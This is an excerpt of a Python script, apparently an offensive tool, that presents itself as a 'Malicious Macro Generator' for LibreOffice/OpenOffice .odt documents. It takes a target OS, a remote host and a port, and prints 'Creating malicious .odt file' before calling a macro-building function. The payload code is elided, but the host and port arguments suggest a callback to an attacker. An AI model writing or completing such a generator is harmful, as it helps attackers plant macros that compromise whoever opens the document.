...
def Help():
	...
	print ('LibreOffice/OpenOffice .odt Writer Document Malicious Macro Generator')
	print ('Usage python3 mmg-odt.py <linux/windows> <rhost> <rport>')
	sys.exit(1)
...
if sys.argv[1] == 'windows':
	...
	print ("[" + Fore.GREEN + "+" + Fore.RESET + "] Creating malicious .odt file\n")
	Macro_Gen()
